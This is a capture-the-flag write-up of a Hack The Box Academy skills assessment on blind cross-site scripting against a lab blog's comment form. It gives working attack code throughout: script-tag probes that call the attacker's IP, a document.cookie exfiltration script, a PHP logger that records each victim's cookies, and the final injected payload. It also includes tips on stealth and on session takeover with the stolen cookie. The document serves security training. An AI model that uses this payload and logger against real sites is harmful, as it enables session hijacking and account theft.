# Cross-Site Scripting (XSS) — Skills Assessment

**Platform:** Hack The Box Academy  
**Module:** Cross-Site Scripting (XSS)  
**Assessment:** Skills Assessment  
**Difficulty:** Medium  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|--------|
| 1 | Navigate to `/assessment` — identify comment approval workflow | Admin reviews all submitted comments — blind XSS surface confirmed |
| 2 | Open blog post — identify all comment form input fields | Name, Email, Website, Comment fields discovered |
| 3 | Start netcat listener — inject remote script payload into all fields | `/WebsiteField` callback received — Website field confirmed vulnerable |
| 4 | Write `script.js` cookie grabber and `index.php` cookie logger | Attack infrastructure prepared |
| 5 | Start PHP HTTP server — inject final payload in Website field | Admin views comment → requests `script.js` → cookie sent to PHP server |
| 6 | Parse PHP server logs — extract `flag` cookie value | Admin session cookie captured — flag retrieved |

---

## Question 1 — Steal the Admin Session Cookie via Blind XSS

**Question:** "What is the value of the 'flag' cookie?"

---

### Step 1 — Enumerate the Target and Identify the Blind XSS Surface

Navigate to `http://10.129.43.173/assessment`. The page is a security blog with a comment section displaying a notice:

```
Comments must be approved by an admin.
```

This single message is the most important discovery on the page — it confirms that every submitted comment is reviewed by an admin in a back-end panel that we cannot access directly. This is the hallmark of a **Blind XSS** attack surface: our payload will execute in an environment we have no direct visibility into.

Clicking on the blog post **"Welcome to Security Blog"** reveals the comment form with the following fields:

- **Name**
- **Email**
- **Website**
- **Comment**

The goal is to determine which field renders user input unsanitised in the admin panel — and then weaponise it to steal the admin's session cookie.

---

### Step 2 — Start a Netcat Listener to Detect Vulnerable Fields

Before injecting any payloads, start a listener on the attack host to receive incoming HTTP callbacks. Each field will be tested with a uniquely named payload so the field name appears in the callback path — making it immediately obvious which field triggered the request.

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 9001
```

```
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

---

### Step 3 — Inject Remote Script Probes Into All Fields

Use the following blind XSS probe format for each input field. The path after the IP (e.g., `/WebsiteField`) uniquely identifies which field sent the request:

```html
'><script src="http://10.10.16.36:9001/FieldName"></script>
```

Test all fields simultaneously in a single comment submission:

| Field | Payload |
|-------|---------|
| Name | `'><script src="http://10.10.16.36:9001/NameField"></script>` |
| Email | *(skip — email format validation enforced on both front and back end)* |
| Website | `'><script src="http://10.10.16.36:9001/WebsiteField"></script>` |
| Comment | `'><script src="http://10.10.16.36:9001/CommentField"></script>` |

> **Note:** The email field is skipped — email format validation is commonly enforced on both the client and server side, making it resistant to XSS payloads. Likewise, password fields are typically hashed before storage and never rendered back, so they are excluded from blind XSS testing.

Click **Post Comment** and wait for the admin to review the submission.

---

### Step 4 — Identify the Vulnerable Field from Callback

After the admin reviews the submitted comment in the back-end panel, the netcat listener receives a callback:

```
Ncat: Connection from 10.129.43.173.
Ncat: Connection from 10.129.43.173:42254.
GET /WebsiteField HTTP/1.1
Host: 10.10.16.36:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.101 Safari/537.36
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

The request path is `/WebsiteField` — confirming the **Website field** is rendered unsanitised in the admin panel and successfully executes JavaScript when the admin views the comment.

Two critical details from the callback:
- **User-Agent: HeadlessChrome** — confirms this is an automated headless browser, not a real user clicking links — the admin panel auto-loads all comments in a headless context
- **Referer: http://127.0.0.1/** — confirms the admin panel runs on localhost, invisible from our perspective

---

### Step 5 — Build the Cookie Stealing Infrastructure

With the vulnerable field confirmed, set up the full session hijacking toolkit: a JavaScript cookie grabber and a PHP server to receive and log the stolen cookie.

**Write `script.js` — the cookie grabber:**

```bash
Hackerpatel007_1@htb[/htb]$ cat << 'EOF' > script.js
new Image().src='http://10.10.16.36:9001/index.php?c=' + document.cookie;
EOF
```

```javascript
new Image().src='http://10.10.16.36:9001/index.php?c=' + document.cookie;
```

This payload creates an invisible image object. The `src` is constructed by appending `document.cookie` to our server URL — causing the browser to make a GET request to our PHP listener with the admin's full cookie string in the URL parameter `c`. The `new Image()` approach is stealthier than `document.location` since it makes a background request without navigating the admin away from the panel.

**Write `index.php` — the cookie logger:**

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

This PHP script receives the cookie string from the `c` GET parameter, splits it on `;` to handle multiple cookies cleanly, URL-decodes each value, and appends them to `cookies.txt` — one line per cookie, with the victim's IP prepended for attribution. Each new victim who triggers the payload adds their cookies to the same file.

---

### Step 6 — Start the PHP HTTP Server

In the same directory containing `script.js` and `index.php`, start the PHP development server:

```bash
Hackerpatel007_1@htb[/htb]$ php -S 0.0.0.0:9001
```

```
[Tue Nov 29 04:14:23 2022] PHP 7.4.30 Development Server (http://0.0.0.0:9001) started
```

The server now serves `script.js` when requested and processes `/index.php?c=` cookie submissions simultaneously.

---

### Step 7 — Inject the Final Cookie Stealing Payload

Submit a new comment with the weaponised payload in the **Website** field:

```html
'><script src=http://10.10.16.36:9001/script.js></script>
```

**How the payload works:**

The leading `'>` breaks out of the HTML attribute context. If the Website field is wrapped in an anchor tag like `<a href='VALUE'>`, injecting `'>` closes the `href` attribute and the `<a>` tag, then `<script src=...>` opens a new script element that loads our remote cookie grabber. The browser executes whatever JavaScript `script.js` contains — in this case, the `new Image()` cookie exfiltration code.

Leave the remaining fields populated with legitimate-looking values and click **Post Comment**.

---

### Step 8 — Capture the Admin Cookie and Retrieve the Flag

When the admin reviews the newly submitted comment in the back-end panel, the headless browser renders the Website field, executes the injected `<script>` tag, fetches `script.js` from our server, and runs the cookie grabber payload. The PHP server receives two sequential requests:

```
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 [200]: (null) /script.js
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 [200]: GET /WebsiteField
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1669695315;%20flag=HTB{flag_redacted}
```

The full cookie string delivered to our server:

```
wordpress_test_cookie=WP Cookie check
wp-settings-time-2=1669695315
flag=HTB{flag_redacted}
```

The `flag` cookie contains the assessment answer. To use this session for account takeover, open Firefox DevTools → Storage tab (`SHIFT+F9`) → add each cookie with its name and value → refresh the admin panel URL.

> **Answer:** `HTB{flag_redacted}`

---

## Flags

| Question | Description | Answer |
|----------|-------------|--------|
| Q1 — flag cookie value | Admin session cookie exfiltrated via blind XSS in Website field | `HTB{flag_redacted}` |

---

## Lessons Learned

- **"Comments must be approved by an admin" is a blind XSS indicator.** Whenever a web application routes user input to a page that only privileged users can access, test every input field for blind XSS. The attack surface is invisible but the impact is exactly the same as regular stored XSS — or worse, because the victim is always a privileged user.

- **Field-specific path naming is essential for blind XSS field identification.** Using a unique path suffix per field (`/NameField`, `/WebsiteField`, `/CommentField`) in the remote script probe immediately identifies the vulnerable field from the callback — without needing to test each field in isolation across separate submissions.

- **The HeadlessChrome User-Agent confirms automated admin review.** When the callback User-Agent is a headless browser (Chromium, PhantomJS, Puppeteer), the admin panel renders comments programmatically — any JavaScript in the comment executes immediately when the admin loads the review page, with no additional interaction required.

- **`new Image().src` is the stealthiest cookie exfiltration method.** Unlike `document.location` which redirects the admin's browser away from the panel (potentially raising suspicion), `new Image()` sends the cookie via a background HTTP request with no visible page change. The admin sees nothing unusual while their session cookie is already en route to the attacker's server.

- **The PHP cookie logger enables multi-victim capture.** A simple `cookies.txt` append loop means the infrastructure stays up — any subsequent admin who views the infected comment will also have their cookies logged without requiring the attacker to interact further. This is the compounding power of stored blind XSS.

- **WordPress stores multiple cookies simultaneously.** The captured cookie string contained three separate cookies: `wordpress_test_cookie`, `wp-settings-time-2`, and `flag`. In real engagements, the session cookie would be `wordpress_logged_in_*` — the one that grants authenticated access when set in the browser. Always parse the full cookie string to identify the high-value session token.

- **Blind XSS requires patience and persistence.** Unlike standard reflected or stored XSS where execution is immediate, blind XSS depends on an admin reviewing the submission. In real engagements this could take hours or days — the infrastructure must remain running and accessible. Using a VPS or a persistent machine rather than a local listener is essential for production engagements.

---

## Full Attack Chain Reference

```
http://10.129.43.173/assessment
        ↓
Blog post → comment form with Name, Email, Website, Comment fields
Note: "Comments must be approved by an admin" → blind XSS surface
        ↓
nc -nvlp 9001 → start listener on attack host
        ↓
Inject '><script src="http://10.10.16.36:9001/FieldName"></script> per field
        ↓
Admin reviews comment in back-end panel (HeadlessChrome)
        ↓
Callback received: GET /WebsiteField → Website field confirmed vulnerable
        ↓
Write script.js: new Image().src='http://10.10.16.36:9001/index.php?c='+document.cookie
Write index.php: PHP cookie logger → cookies.txt
        ↓
php -S 0.0.0.0:9001 → serve script.js and handle /index.php requests
        ↓
Inject '><script src=http://10.10.16.36:9001/script.js></script> in Website field
        ↓
Admin reviews comment → HeadlessChrome fetches script.js → cookie grabber executes
        ↓
PHP server receives: GET /index.php?c=wordpress_test_cookie=...;flag=HTB{flag_redacted}
        ↓
flag cookie value extracted → HTB{flag_redacted}
```

---

## Commands Reference

| Command | Purpose |
|---------|--------|
| `nc -nvlp 9001` | Start netcat listener to receive blind XSS callback probes |
| `'><script src="http://10.10.16.36:9001/FieldName"></script>` | Blind XSS field probe — unique path per field identifies which is vulnerable |
| `cat << 'EOF' > script.js` | Write cookie grabber script to file using heredoc |
| `new Image().src='http://10.10.16.36:9001/index.php?c='+document.cookie` | JS cookie grabber — background GET request with full cookie string |
| `php -S 0.0.0.0:9001` | Start PHP dev server to serve script.js and receive cookie submissions |
| `'><script src=http://10.10.16.36:9001/script.js></script>` | Final weaponised payload injected into vulnerable Website field |
| `cat cookies.txt` | Read captured cookies from PHP logger output file |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1059 | T1059.007 | Command and Scripting Interpreter: JavaScript — blind XSS payload executing in admin's HeadlessChrome browser |
| T1185 | — | Browser Session Hijacking — `document.cookie` exfiltrated from admin's active WordPress session |
| T1056 | T1056.003 | Input Capture: Web Portal Capture — comment form used as injection delivery mechanism |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — captured cookies written to `cookies.txt` on attack host |
| T1550 | T1550.004 | Use Alternate Authentication Material: Web Session Cookie — stolen `flag` cookie usable for session takeover |
| T1583 | T1583.001 | Acquire Infrastructure — PHP HTTP server on attack host used to serve payload and log stolen cookies |

---

*Part of the HTB Academy CPTS path — Cross-Site Scripting (XSS) module.*  
*Penetration Tester role in India | Target: January 2027*
